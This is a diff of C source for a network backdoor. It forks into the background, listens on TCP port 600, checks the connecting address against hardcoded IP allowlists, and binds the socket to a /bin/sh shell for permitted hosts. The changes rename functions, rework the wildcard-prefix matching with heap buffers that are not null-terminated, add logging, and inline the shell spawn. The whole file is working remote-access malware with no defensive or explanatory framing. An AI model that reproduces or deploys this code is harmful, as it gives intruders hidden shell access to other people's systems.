@@ -7,14 +7,16 @@
 #include <errno.h>
 #include <string.h>
 
-#define MAXCON 31337
+#define MAXCON 2
 
-#define STARTUP 0  //Set defaultly to false, because the future is not reliably working on all linux distros, needs some more work.
+#define PORT 600
+
+#define STARTUP 0  //Set to false by default, feature is not reliably working on all linux distros, needs some more work.
 
 u_char* AllowedIP[] = { "192.169.1.43", "182.68.177.123", (void*)0 };
-char* DynamicIP[] = { "62.129.*", (void*)0 };
+char* DynamicIP[] = { "62.229.*", (void*)0 }; // "122.162.*",
 
-int AuthCheck(u_char *ip)
+int Authorize(u_char *ip)
 {
     int i;
     for (i=0; AllowedIP[i] != NULL; i++)
@@ -26,32 +28,46 @@ int AuthCheck(u_char *ip)
     }
     for (i=0; DynamicIP[i] != NULL; i++)
     {
-        int x = (int)(strchr(DynamicIP[i], '*') - DynamicIP[i] - 1);
+        int x = (int)(strchr(DynamicIP[i], '*') - DynamicIP[i]);
+        
+        //STRIP * CHAR AWAY
+        char* substr1 = (char*) malloc(x);
+        strncpy(substr1, DynamicIP[i], x);
+        //printf("\n%d\nSubstring of allowed IP: %s\n", x, substr1);
 
-        char substring[] = "";
-        strncat(substring, &argv[1][0], x+1);
+        //MAKE SUBSTRING OF INCOMING IP
+        char* substring = (char*) malloc(x + 1);
+        strncpy(substring, ip, x);
 
-        //printf("substring: %s, IPallowed: %s\n", substring, DynamicIP[i]);
+        //printf("\n%d\nSubstring of incoming IP: %s\n", x, substring);
 
-        if (!strncmp(substring, DynamicIP[i], x+1))
+        printf("INCOMING: %s, ALLOWED: %s\n", substring, substr1);
+        
+        if (!strncmp(substring, substr1, x))
         {
-            printf("\nAccess granted!\n");
+            printf("\nAccess for %s granted!\n", ip);
             return 1;
+        }
+        else{
+            printf("\nAccess for %s denied!\n", ip);
         }
     }
     return 0;
 }
 
-void domything(u_int sd, u_char *src) 
+void doMyThing(u_int sd, u_char *src) 
 {
-    if (AuthCheck(src))
+    if (Authorize(src))
     {
-        dup2(sd, 0); //err
+        dup2(sd, 0); //in
         dup2(sd, 1); //out
-        dup2(sd, 2); //in
+        dup2(sd, 2); //err
         execl("/bin/sh", "/bin/sh", (char *)0);
-        close(sd); 
+        close(sd);
         exit(0);
+    }
+    else{
+
     }
 }
 
@@ -115,7 +131,7 @@ int main(int argc, char *argv[])
 
     local.sin_family = AF_INET;
     local.sin_addr.s_addr = INADDR_ANY;
-    local.sin_port = htons(477);
+    local.sin_port = htons(PORT);
 
     if ((sIN = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
@@ -129,26 +145,40 @@ int main(int argc, char *argv[])
         return 1; 
     }
 
-    if (listen(sIN, MAXCON)) 
+    if (listen(sIN, MAXCON))
     {
         perror("listen() failed");
-        return 1; 
+        return 1;
     }
 
     if (fork()) exit(0);
 
-    len = sizeof(local);    
+    len = sizeof(local);
 
-    while (1) 
+    while (1)
     {
         sOUT = accept(sIN, (struct sockaddr *)&remote, &len);
         if (fork() != 0)
         {
             close(sIN);
-            domything(sOUT, inet_ntoa(remote.sin_addr));
+            //doMyThing(sOUT, inet_ntoa(remote.sin_addr));
+
+            if (Authorize(inet_ntoa(remote.sin_addr)))
+    		{
+    			dup2(sOUT, 0); //in
+        		dup2(sOUT, 1); //out
+        		dup2(sOUT, 2); //err
+        		execl("/bin/sh", "/bin/sh", (char *)0);
+        		close(sOUT);
+        		exit(0);
+        	}
+        	else{
+        		exit(0);
+        	}
         }
         close(sOUT);
     }
     close(sIN);
     return 0;
 }
+
